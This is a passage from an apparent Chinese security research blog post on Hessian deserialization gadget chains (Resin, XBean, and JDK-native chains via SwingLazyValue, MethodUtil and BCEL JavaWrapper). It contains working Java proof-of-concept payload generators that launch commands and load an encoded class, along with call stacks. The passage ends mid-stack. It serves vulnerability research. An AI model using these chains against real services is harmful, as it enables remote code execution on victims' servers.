src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/29.png"></p><p>java.util.HashMap#put会调用到key的hashCode、equals方法检查key是否重复</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/30.png"></p><p>java.util.TreeMap#put会调用key的compareTo、comparator属性的compare方法进行排序</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/31.png"></p><p>所以寻找hessian反序列化链的要点：</p><p>1、起点是hashCode&#x2F;equals&#x2F;compareTo等方法</p><p>2、执行方法不依赖类本身readObject&#x2F;getter&#x2F;setter等方法的逻辑</p><p>3、无论目标类是否实现Serializable接口，都不影响反序列化操作</p><p>4、目标类的构造方法必须是public状态（_unsafe.allocateInstance创建实例时并未调用setAccessable设置）</p><p>hessian目前在 <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a> 中的链：Rome、XBean、Resin、SpringPartiallyComparableAdvisorHolder、SpringAbstractBeanFactoryPointcutAdvisor，挑XBean与Resin分析下，再看看JDK原生的两条链</p><h4 id="3-3-1-Resin利用链"><a href="#3-3-1-Resin利用链" class="headerlink" title="3.3.1 Resin利用链"></a>3.3.1 Resin利用链</h4><p>Resin利用链入口是com.sun.org.apache.xpath.internal.objects.XString#equals方法，最终触发点是 javax.naming.spi.NamingManager#getObjectFactoryFromReference远程加载类，高版本的JDK关闭了加载，但是存在一些factory的绕过，不过多阐述。在笔者之前的JNDI注入文章说明过：<a href="https://pwnull.github.io/2022/jndi-injection-history/">https://pwnull.github.io/2022/jndi-injection-history/</a></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getObjectFactoryFromReference:</span><span class="hljs-number">156</span>, NamingManager (javax.naming.spi)<br><span class="hljs-symbol">getObjectInstance:</span><span class="hljs-number">319</span>, NamingManager (javax.naming.spi)<br><span class="hljs-symbol">getContext:</span><span class="hljs-number">439</span>, NamingManager (javax.naming.spi)<br><span class="hljs-symbol">getTargetContext:</span><span class="hljs-number">55</span>, ContinuationContext (javax.naming.spi)<br><span class="hljs-symbol">composeName:</span><span class="hljs-number">180</span>, ContinuationContext (javax.naming.spi)<br><span class="hljs-symbol">toString:</span><span class="hljs-number">353</span>, QName (<span class="hljs-keyword">com</span>.caucho.naming)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">392</span>, XString (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xpath.internal.objects)<br><span class="hljs-symbol">putVal:</span><span class="hljs-number">634</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">611</span>, HashMap (java.util)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">577</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">1160</span>, HessianInput (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/32.png"></p><h4 id="3-3-2-XBean利用链"><a href="#3-3-2-XBean利用链" class="headerlink" title="3.3.2 XBean利用链"></a>3.3.2 XBean利用链</h4><p>XBean利用链与resin的很类似，均利用了XString#equals、触发点NamingManager#getObjectFactoryFromReference，只不过由QName换成了Binding。留个问题：为什么不使用XString直接去触发，而是要使用spring中的HotSwappableTargetSource</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getObjectFactoryFromReference:<span class="hljs-number">156</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)<br>getObjectInstance:<span class="hljs-number">319</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)<br>resolve:<span class="hljs-number">73</span>, ContextUtil (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span><span class="hljs-selector-class">.naming</span>.context)<br>getObject:<span class="hljs-number">204</span>, ContextUtil<span class="hljs-variable">$ReadOnlyBinding</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span><span class="hljs-selector-class">.naming</span>.context)<br>toString:<span class="hljs-number">192</span>, Binding (javax.naming)<br>equals:<span class="hljs-number">392</span>, XString (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xpath</span><span class="hljs-selector-class">.internal</span>.objects)<br>equals:<span class="hljs-number">104</span>, HotSwappableTargetSource (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.aop</span>.target)<br>putVal:<span class="hljs-number">634</span>, HashMap (java.util)<br>put:<span class="hljs-number">611</span>, HashMap (java.util)<br>readMap:<span class="hljs-number">114</span>, MapDeserializer (com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)<br>readMap:<span class="hljs-number">577</span>, SerializerFactory (com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)<br>readObject:<span class="hljs-number">1160</span>, HessianInput (com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/33.png"></p><h4 id="3-3-3-JDK原生链"><a href="#3-3-3-JDK原生链" class="headerlink" title="3.3.3 JDK原生链"></a>3.3.3 JDK原生链</h4><p>0ctf2022的题目 hessian only jdk，题目预期解是寻找只依赖于jdk的Hessian反序列化利用链。题目信息在这里：<a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk</a>  </p><p>Hessian服务端在还原Map类型数据时，会调用put方法，在put方法中会触发key、value的equals&#x2F;hashCode等操作，这是反序列化链的开始。另外在Hessian反序列化过程中，如果客户端指定的类型type与实际对象类型不一致时会调用异常处理函数except，这个函数会调用obj#toString方法打印obj。这个洞被分配了编号CVE-2021-43297。所以利用这个漏洞为Hessian反序列化链增加了一个入口：toString方法。现在可用的入口方法：equals&#x2F;hashCode&#x2F;toString&#x2F;compareTo</p><p>另外Hashtable#equals方法会触发其value值的get方法，在JDK中存在<code>javax.swing.UIDefaults#get(Object)-&gt;sun.swing.SwingLazyValue#createValue-&gt;sun.reflect.misc.MethodUtil#invoke(static)</code>这条链路，<strong>方法sun.swing.SwingLazyValue#createValue可以调用任意静态方法或者是任意类的构造方法（va2）</strong>，所以Hessian JDK原生链基本都是寻找<code>静态函数---&gt;RCE</code>的链路，主要有两种思路：1、修改环境配置，绕过JDK安全限制；2、静态方法直接触发RCE。当然还有从xxx.toString-&gt;invoke()-&gt;static function-&gt;rce的链路</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/34.png"></p><h5 id="3-3-3-1-MethodUtils-invoke"><a href="#3-3-3-1-MethodUtils-invoke" class="headerlink" title="3.3.3.1  MethodUtils.invoke"></a>3.3.3.1  MethodUtils.invoke</h5><p>有师傅找到了sun.reflect.misc.MethodUtil#invoke这个静态方法，将调用任意静态方法转化为了调用任意方法，结合ProcessBuilder.start完成RCE</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/35.png"></p><p>生成序列化数据的poc代码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static HashMap&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; getObject2() throws <span class="hljs-keyword">Exception</span> &#123;<br>        <span class="hljs-keyword">Object</span> target = <span class="hljs-built_in">new</span> ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,&quot;calc&quot;);<br>        <span class="hljs-keyword">Method</span> invoke = sun.reflect.misc.MethodUtil.<span class="hljs-keyword">class</span>.getMethod(&quot;invoke&quot;, <span class="hljs-keyword">Method</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">Object</span>[].<span class="hljs-keyword">class</span>);<br>        <span class="hljs-keyword">Method</span> start = ProcessBuilder.<span class="hljs-keyword">class</span>.getMethod(&quot;start&quot;);<br>        SwingLazyValue swingLazyValue = <span class="hljs-built_in">new</span> SwingLazyValue(<br>                &quot;sun.reflect.misc.MethodUtil&quot;,<br>                &quot;invoke&quot;,<br>                <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;invoke, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>(), <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;<span class="hljs-keyword">start</span>, target, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&#125;&#125;&#125;);<br>        <span class="hljs-keyword">Object</span>[] keyValueList = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&quot;abc&quot;,swingLazyValue&#125;;<br>        UIDefaults uiDefaults1 = <span class="hljs-built_in">new</span> UIDefaults(keyValueList);<br>        UIDefaults uiDefaults2 = <span class="hljs-built_in">new</span> UIDefaults(keyValueList);<br><br>        Hashtable&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; hashtable1 = <span class="hljs-built_in">new</span> Hashtable&lt;&gt;();<br>        Hashtable&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; hashtable2 = <span class="hljs-built_in">new</span> Hashtable&lt;&gt;();<br>        hashtable1.put(&quot;a&quot;,uiDefaults1);<br>        hashtable2.put(&quot;a&quot;,uiDefaults2);<br>        <span class="hljs-keyword">return</span> MakeUtils.makeMap(hashtable1,hashtable2);<br>&#125;<br></code></pre></td></tr></table></figure><p>整体的调用栈：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">start:</span><span class="hljs-number">1007</span>, ProcessBuilder (java.lang)<br>invoke调用<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">275</span>, MethodUtil (sun.reflect.misc)<br>invoke调用<br><span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br><span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">813</span>, Hashtable (java.util)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">813</span>, Hashtable (java.util)<br><span class="hljs-symbol">putVal:</span><span class="hljs-number">634</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">611</span>, HashMap (java.util)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">577</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">1160</span>, HessianInput (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/36.png"></p><h5 id="3-3-2-PKCS9Attributes-toString-gt-JavaWrapper-main"><a href="#3-3-2-PKCS9Attributes-toString-gt-JavaWrapper-main" class="headerlink" title="3.3.2 PKCS9Attributes#toString-&gt;JavaWrapper._main"></a>3.3.2 PKCS9Attributes#toString-&gt;JavaWrapper._main</h5><p>这条链的前半部分利用了<code>PKCS9Attributes#toString-&gt;UIDefaults#get </code>，后半部分静态方法使用的是<code>com.sun.org.apache.bcel.internal.util.JavaWrapper#_main</code>，这个方法中classloader（com.sun.org.apache.bcel.internal.util.ClassLoader）加载bcel串得到class，接着再调用自定义类的 <code>_main</code> 方法。另外bcelclassloader com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass加载class时使用的是defineClass而不是Class.forName，不会直接加载静态代码块中的代码，所以需要将执行的代码写入到 <code>_main</code>方法中完成利用</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/37.png"></p><p>生成序列化数据的poc代码，这个需要注意在序列化数据时提前写入一个字符导致触发expect进而完成<code>Hessian2Input#readObject---&gt;XXX.toString</code>得链路连接。经研究，除了67，另外79、81、86、88都是可以的，因为都调用了readInt，最终都可以触发expect方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import com.sun.org.apache.bcel.internal.Repository;<br>import com.sun.org.apache.bcel.internal.classfile.Utility;<br>import org.utils.Payload;<br>import org.utils.Reflections;<br>import sun.reflect.ReflectionFactory;<br>import sun.security.pkcs.PKCS9Attribute;<br>import sun.security.pkcs.PKCS9Attributes;<br>import sun.swing.SwingLazyValue;<br>import javax.swing.*;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.InvocationTargetException;<br><br>public <span class="hljs-keyword">class</span> JavaWrapperBcel &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run267(get<span class="hljs-constructor">JavaWrapperBcelObject()</span>);<br>    &#125;<br>    public static Object get<span class="hljs-constructor">JavaWrapperBcelObject()</span> throws Exception &#123;<br>        PKCS9Attributes s = create<span class="hljs-constructor">WithoutConstructor(PKCS9Attributes.<span class="hljs-params">class</span>)</span>;<br>        UIDefaults uiDefaults = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;<br>        String payload = <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(EvilMain.<span class="hljs-params">class</span>)</span>.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(payload);<br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">new</span> String[]&#123;<span class="hljs-params">payload</span>&#125;&#125;)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reflections</span>.</span></span>set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>,<span class="hljs-string">&quot;attributes&quot;</span>,<span class="hljs-params">uiDefaults</span>)</span>;<br>        return s;<br>    &#125;<br>    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;<br>    &#125;<br><br>    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;<br>        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;<br>        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/38.png"></p><p>调用栈：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">exec:</span><span class="hljs-number">347</span>, Runtime (java.lang)<br><span class="hljs-symbol">_main:</span><span class="hljs-number">5</span>, $$BCEL$$$l<span class="hljs-number">$8b</span><span class="hljs-number">$I</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$AmQMO</span><span class="hljs-number">$c2</span><span class="hljs-number">$40</span><span class="hljs-number">$Q</span><span class="hljs-number">$7d</span><span class="hljs-number">$L</span><span class="hljs-number">$85</span><span class="hljs-number">$d2</span><span class="hljs-number">$8a</span><span class="hljs-number">$f2</span><span class="hljs-number">$r</span><span class="hljs-number">$f8</span><span class="hljs-number">$fd</span><span class="hljs-number">$7d</span><span class="hljs-number">$Q</span><span class="hljs-number">$3c</span><span class="hljs-number">$d8</span><span class="hljs-number">$8b</span><span class="hljs-number">$H</span><span class="hljs-number">$T</span><span class="hljs-number">$8c</span><span class="hljs-number">$X</span><span class="hljs-number">$a3</span><span class="hljs-number">$a7F</span><span class="hljs-number">$8d</span><span class="hljs-number">$Y</span><span class="hljs-number">$3cx0K</span><span class="hljs-number">$dd</span><span class="hljs-number">$d4</span><span class="hljs-number">$r</span><span class="hljs-number">$a5</span><span class="hljs-number">$rm</span><span class="hljs-number">$n</span><span class="hljs-number">$fc</span><span class="hljs-number">$z</span>$_j<span class="hljs-number">$3c</span><span class="hljs-number">$f8</span><span class="hljs-number">$D</span><span class="hljs-number">$fcQ</span><span class="hljs-number">$c6</span><span class="hljs-number">$d9j</span><span class="hljs-number">$acQ6</span><span class="hljs-number">$d9y</span><span class="hljs-number">$9973</span><span class="hljs-number">$ef</span><span class="hljs-number">$cdf</span><span class="hljs-number">$df</span><span class="hljs-number">$3f</span><span class="hljs-number">$5e</span><span class="hljs-number">$df</span><span class="hljs-number">$A</span><span class="hljs-number">$i</span><span class="hljs-number">$60</span><span class="hljs-number">$c7D</span><span class="hljs-number">$k</span><span class="hljs-number">$N</span><span class="hljs-number">$T</span><span class="hljs-number">$LX</span><span class="hljs-number">$y</span><span class="hljs-number">$60I</span><span class="hljs-number">$e1</span><span class="hljs-number">$b2</span><span class="hljs-number">$8e</span><span class="hljs-number">$V</span><span class="hljs-number">$j</span><span class="hljs-number">$ab</span><span class="hljs-number">$M</span><span class="hljs-number">$f9</span><span class="hljs-number">$p</span><span class="hljs-number">$e9</span><span class="hljs-number">$cb</span><span class="hljs-number">$f8</span><span class="hljs-number">$98</span><span class="hljs-number">$n</span><span class="hljs-number">$dblu</span><span class="hljs-number">$Z</span><span class="hljs-number">$b4</span><span class="hljs-number">$93</span><span class="hljs-number">$e0</span><span class="hljs-number">$5e0</span><span class="hljs-number">$94l</span><span class="hljs-number">$e9</span><span class="hljs-number">$8b</span><span class="hljs-number">$f3</span><span class="hljs-number">$d1</span><span class="hljs-number">$a0</span><span class="hljs-number">$t</span><span class="hljs-number">$c2k</span><span class="hljs-number">$de</span><span class="hljs-number">$f3</span><span class="hljs-number">$88</span><span class="hljs-number">$a9</span><span class="hljs-number">$da</span><span class="hljs-number">$81</span><span class="hljs-number">$c3</span><span class="hljs-number">$bd</span>$$$P<span class="hljs-number">$a5</span><span class="hljs-number">$ca</span><span class="hljs-number">$bfI</span><span class="hljs-number">$z</span><span class="hljs-number">$7e</span><span class="hljs-number">$90QR</span><span class="hljs-number">$L</span><span class="hljs-number">$5dKL</span><span class="hljs-number">$f8</span><span class="hljs-number">$60</span><span class="hljs-number">$e8</span><span class="hljs-number">$J</span><span class="hljs-number">$x</span><span class="hljs-number">$WQ</span><span class="hljs-number">$dcf</span><span class="hljs-number">$c8</span><span class="hljs-number">$dd</span><span class="hljs-number">$N</span><span class="hljs-number">$b8</span><span class="hljs-number">$f4</span><span class="hljs-number">$Z</span><span class="hljs-number">$g</span><span class="hljs-number">$cd</span><span class="hljs-number">$5b</span><span class="hljs-number">$bb</span><span class="hljs-number">$cf</span><span class="hljs-number">$c7</span><span class="hljs-number">$dc</span><span class="hljs-number">$f2</span><span class="hljs-number">$b8</span><span class="hljs-number">$efZ</span><span class="hljs-number">$9d8</span><span class="hljs-number">$94</span><span class="hljs-number">$be</span><span class="hljs-number">$dbN</span><span class="hljs-number">$acx</span><span class="hljs-number">$e8</span><span class="hljs-number">$8e</span><span class="hljs-number">$ZjS</span><span class="hljs-number">$ca</span><span class="hljs-number">$M</span><span class="hljs-number">$e6</span><span class="hljs-number">$e9</span><span class="hljs-number">$c4</span><span class="hljs-number">$R</span><span class="hljs-number">$c3X</span><span class="hljs-number">$G</span><span class="hljs-number">$7e</span><span class="hljs-number">$a4c</span><span class="hljs-number">$8d</span><span class="hljs-number">$f2N0</span><span class="hljs-number">$K</span><span class="hljs-number">$jq</span><span class="hljs-number">$s</span><span class="hljs-number">$95</span><span class="hljs-number">$ad</span><span class="hljs-number">$a1</span><span class="hljs-number">$y</span><span class="hljs-number">$f6</span><span class="hljs-number">$d5T</span><span class="hljs-number">$R</span><span class="hljs-number">$3a</span><span class="hljs-number">$K</span><span class="hljs-number">$3a</span><span class="hljs-number">$d6</span><span class="hljs-number">$8b</span><span class="hljs-number">$d8</span><span class="hljs-number">$c0</span><span class="hljs-number">$sI</span><span class="hljs-number">$d2</span><span class="hljs-number">$8aN</span><span class="hljs-number">$R</span><span class="hljs-number">$5b</span><span class="hljs-number">$d8f</span><span class="hljs-number">$u</span><span class="hljs-number">$ff</span><span class="hljs-number">$dd</span><span class="hljs-number">$89</span><span class="hljs-number">$a8</span><span class="hljs-number">$d4</span><span class="hljs-number">$e8</span><span class="hljs-number">$a2</span><span class="hljs-number">$d7</span><span class="hljs-number">$X</span><span class="hljs-number">$OQ</span><span class="hljs-number">$b5</span><span class="hljs-number">$94</span><span class="hljs-number">$faqd</span><span class="hljs-number">$a8</span><span class="hljs-number">$a4</span><span class="hljs-number">$ec</span><span class="hljs-number">$d5</span><span class="hljs-number">$c8</span><span class="hljs-number">$8f</span><span class="hljs-number">$e5</span><span class="hljs-number">$80LMW</span><span class="hljs-number">$c4</span><span class="hljs-number">$3fI</span><span class="hljs-number">$bd</span><span class="hljs-number">$d9</span><span class="hljs-number">$b2</span><span class="hljs-number">$ff</span><span class="hljs-number">$f5</span><span class="hljs-number">$d0</span><span class="hljs-number">$da</span><span class="hljs-number">$9a</span><span class="hljs-number">$98</span><span class="hljs-number">$I</span><span class="hljs-number">$87a</span><span class="hljs-number">$b79</span><span class="hljs-number">$e5</span><span class="hljs-number">$c9</span><span class="hljs-number">$bf</span><span class="hljs-number">$a8</span><span class="hljs-number">$cb0pD</span><span class="hljs-number">$U</span><span class="hljs-number">$b5i</span><span class="hljs-number">$d3</span><span class="hljs-number">$i</span><span class="hljs-number">$fd</span><span class="hljs-number">$8c</span><span class="hljs-number">$3a</span><span class="hljs-number">$Z0</span><span class="hljs-number">$f5</span><span class="hljs-number">$W</span><span class="hljs-number">$8a</span><span class="hljs-number">$Ge</span><span class="hljs-number">$W</span><span class="hljs-number">$n</span><span class="hljs-number">$p</span><span class="hljs-number">$cc</span><span class="hljs-number">$ed</span><span class="hljs-number">$3d</span><span class="hljs-number">$83</span><span class="hljs-number">$3d</span><span class="hljs-number">$se</span><span class="hljs-number">$93b</span><span class="hljs-number">$3e</span><span class="hljs-number">$n</span><span class="hljs-number">$b3</span><span class="hljs-number">$98</span><span class="hljs-number">$a1X</span><span class="hljs-number">$fcj</span><span class="hljs-number">$m</span><span class="hljs-number">$9c</span><span class="hljs-number">$r40</span><span class="hljs-number">$87</span><span class="hljs-number">$Su</span><span class="hljs-number">$a9</span><span class="hljs-number">$e1</span><span class="hljs-number">$c3D</span><span class="hljs-number">$M0</span>_<span class="hljs-number">$90</span><span class="hljs-number">$a9f</span><span class="hljs-number">$9f</span><span class="hljs-number">$a0</span><span class="hljs-number">$dd</span><span class="hljs-number">$a4</span><span class="hljs-number">$K</span><span class="hljs-number">$s</span><span class="hljs-number">$a1</span><span class="hljs-number">$9a2H</span><span class="hljs-number">$xU1QF</span><span class="hljs-number">$85</span><span class="hljs-number">$b0JW</span><span class="hljs-number">$p</span><span class="hljs-number">$a6Fw</span><span class="hljs-number">$3e</span><span class="hljs-number">$99</span><span class="hljs-number">$a9</span><span class="hljs-number">$7f</span><span class="hljs-number">$C</span><span class="hljs-number">$82</span><span class="hljs-number">$f0</span><span class="hljs-number">$e5</span><span class="hljs-number">$edD</span><span class="hljs-number">$C</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">498</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">runMain:</span><span class="hljs-number">131</span>, JavaWrapper (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.bcel.internal.util)<br><span class="hljs-symbol">_main:</span><span class="hljs-number">153</span>, JavaWrapper (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.bcel.internal.util)<br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">498</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br><span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<br><span 